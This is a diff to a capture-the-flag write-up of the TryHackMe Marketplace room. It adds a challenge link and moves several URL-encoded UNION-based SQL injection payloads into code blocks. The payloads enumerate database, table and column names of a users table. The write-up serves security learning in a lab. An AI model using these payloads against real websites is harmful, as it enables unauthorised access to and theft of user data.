@@ -5,6 +5,8 @@
 
 Can you take advantage of this and will you be able to gain root access on his server?
 
+[Challenge link](https://tryhackme.com/room/marketplace)
+
 ---
 
 First started by doing a nmap scan of my target
@@ -127,7 +129,10 @@ I knew it had to be doing some sort of SQL query to fetch the user. So I tried d
 ![image13.png](https://raw.githubusercontent.com/BeastieNate5/CTF-Writeups/refs/heads/main/THM/Marketplace/images/image13.png)
 
 Perfect we can do some SQLi here. Since we know the page displays output from the query we can do a UNION based attack. With some testing this payload satisifes the query without producing any errors
-`user=1000%20UNION%20SELECT%201,2,3,4;`
+
+```
+user=1000%20UNION%20SELECT%201,2,3,4;
+```
 
 Time to enumerate some tables
 
@@ -137,13 +142,18 @@ This following payload leaks all database names
 ![image14.png](https://raw.githubusercontent.com/BeastieNate5/CTF-Writeups/refs/heads/main/THM/Marketplace/images/image14.png)
 
 We need to target the `marketplace` database. By using this payload we get all the tables in the marketplace database
-`user=1000%20UNION%20SELECT%20group_concat(table_name),2,3,4%20FROM%20information_schema.tables%20WHERE%20table_schema%20=%20%27marketplace%27;`
+
+```
+user=1000%20UNION%20SELECT%20group_concat(table_name),2,3,4%20FROM%20information_schema.tables%20WHERE%20table_schema%20=%20%27marketplace%27;
+```
 
 ![image15.png](https://raw.githubusercontent.com/BeastieNate5/CTF-Writeups/refs/heads/main/THM/Marketplace/images/image15.png)
 
 The `users` table caught my interest so I used this next payload to leak its column names
 
-`user=1000%20UNION%20SELECT%20group_concat(column_name),2,3,4%20FROM%20information_schema.columns%20WHERE%20table_name%20=%20%27users%27;`
+```
+user=1000%20UNION%20SELECT%20group_concat(column_name),2,3,4%20FROM%20information_schema.columns%20WHERE%20table_name%20=%20%27users%27;
+```
 
 ![image16.png](https://raw.githubusercontent.com/BeastieNate5/CTF-Writeups/refs/heads/main/THM/Marketplace/images/image16.png)
 
